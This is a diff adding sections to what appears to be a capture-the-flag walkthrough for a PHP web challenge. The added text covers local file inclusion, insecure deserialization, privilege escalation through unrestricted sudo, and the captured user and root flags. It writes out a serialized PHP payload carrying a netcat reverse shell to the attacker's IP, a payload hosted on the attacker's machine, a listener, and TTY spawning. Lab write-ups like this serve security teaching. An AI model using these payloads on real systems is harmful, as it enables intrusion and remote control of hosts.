@@ -92,5 +92,137 @@ Navigating to this directory displays the landing page containing the text ```"F
 ```bash
 <!-- hint: /?file= -->
 ```
+## Vulnerability Analysis & Source Code Review
+### 6. Local File Inclusion (LFI) Analysis
+Leveraging PHP wrappers allows extracting base64-encoded source code from the target index file, capture that request in the burp suite:
+```bash
+http://<TARGET_IP>/<HIDDEN_DIRECTORY>/?file=index.php
+```
+Decoding the response (via CyberChef or terminal tools) reveals the application logic:
+```bash
+error_reporting(0);
+class file {
+    public $file = "dump.txt";
+    public $data = "dump test";
+    function __destruct() {
+        file_put_contents($this->file, $this->data);
+    }
+}
 
+$file_name = $_GET['file'];
+if(isset($file_name) && file_exists($file_name)) {
+    echo "File no Exist!";
+}
+```
+### 7. Insecure Deserialization Mechanics
+-Trigger Mechanism: The __destruct() magic method executes file_put_contents() automatically when an instance of the file class object is destroyed at the end of the script execution lifecycle.
+-Flaw Impact: Passing an untrusted, user-controlled serialized payload via unserialize() allows controlling the $file and $data attributes, enabling arbitrary file creation or file modification on the host system.
+
+---
+
+## PHP Deserialization Payload Testing
+### 8. Create the PHP payload
+Create test.php containing the PHP class and serialized object:
+```bash
+<?php
+class file{
+    public $file = 'test.php';
+    public $data = '<?php shell_exec("nc -e /bin/sh 192.168.135.130 9001"); ?>';
+}
+
+echo (serialize(new file));
+?>
+```
+The file class contains:
+- $file — specifies the file name.
+- $data — contains the PHP code to be executed.
+- serialize() converts the object into a serialized string.
+
+### 9. Generate and save the serialized payload
+Run the following command:
+```bash
+php test.php > test.txt
+```
+- This executes test.php and saves the serialized output into test.txt.
+Verify the output with:
+```bash
+cat test.txt
+```
+This confirms that the serialized object was generated successfully.
+
+### 10. Send the payload using Burp Suite
+- Open the request in Burp Suite Repeater.
+- The file parameter is used to specify the location of the hosted payload:
+```bash
+?file=http://192.168.135.130:8000/test.txt
+```
+- Send the request and inspect the server response.
+- Goal: Test whether the application retrieves and processes the supplied serialized file.
+
+### 11. Change the file reference
+Modify the request to reference the PHP file instead:
+```bash
+?file=http://192.168.135.130:8000/test.php
+```
+- Send the request again through Burp Suite.
+- Goal: Test how the application handles the PHP file and whether the serialized object is processed.
+
+---
+
+## Exploitation & Initial Access
+### 12. Payload Execution & Reverse Shell
+1. Start Listener:
+Set up a local Netcat listener on your attacking machine:
+```bash
+nc -lvnp 9001
+```
+2. Trigger Exploit:
+Pass the serialized string to the vulnerable endpoint via Burp Suite Repeater or curl:
+```bash
+curl "http://<TARGET_IP>/<HIDDEN_DIRECTORY>/?file=test.php"
+```
+3. Establish Connection:
+Verify connection arrival on the listener and spawn an interactive TTY shell:
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+---
+## Post-Exploitation & Privilege Escalation
+1. Initial Access Reconnaissance
+- Current Context: www-data
+- Target User: grecia
+
+Navigate to the user home directory to inspect user files and flags:
+```bash
+cd /home/grecia
+ls -la
+cat user.txt
+```
+### User Flag: 0b6044b7807dd100b9e30f1bd09db53f
+
+2. Sudo Misconfiguration Assessment
+Inspect current user permissions and allowed binary execution options:
+```bash
+sudo -l
+```
+Output Analysis:
+```bash
+User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: ALL
+```
+The www-data service account holds unrestricted sudo permissions without requiring a password.
+
+3. Root Privilege Escalation
+Escalate privileges directly using sudo su:
+```bash
+sudo su
+whoami
+```
+Navigate to the /root directory to retrieve the root flag:
+```bash
+cd /root
+ls -la
+cat root.txt
+```
+### Root Flag: 0028454003b42601548df551b738976c
 
